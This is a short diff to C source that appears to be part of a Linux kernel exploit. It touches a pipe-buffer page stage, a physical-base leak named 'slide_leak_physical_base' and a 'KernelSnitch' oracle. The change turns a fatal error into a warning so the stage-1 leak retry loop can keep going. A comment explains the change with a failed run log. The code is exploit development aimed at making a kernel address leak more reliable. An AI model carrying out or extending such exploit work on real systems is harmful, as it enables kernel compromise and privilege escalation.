@@ -331,7 +331,16 @@ uintptr_t prepare_pipe_buffer_page(void) {
   SYSCHK(close(result_pipe[0]));
   size_t pipe_elapsed_ms = (size_t)((gettime_ns() - pipe_started) / 1000000ULL);
   if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+    /*
+     * pr_error() calls exit(-1) (utils.h), so this must be a warning: the
+     * in-attempt stage-1 retry (slide_leak_physical_base) needs this call to
+     * return 0 so prepare_p0_pipe_oracle() can return 0 and the retry loop can
+     * iterate.  Run 20260810-203930 proved the bug: every stage-1 failure
+     * exited the ATTEMPT with status=255 right here ("pipe page child did not
+     * report base"), so the retry's "stage-1 try=2/3" never engaged (zero
+     * such lines in the whole log despite 16 failures).
+     */
+    pr_warning("pipe page child did not report base\n");
   } else {
     pr_info("pipe KernelSnitch page child base=%016zx direct=%d elapsed_ms=%zu\n",
             base, is_direct_ptr(base) ? 1 : 0, pipe_elapsed_ms);
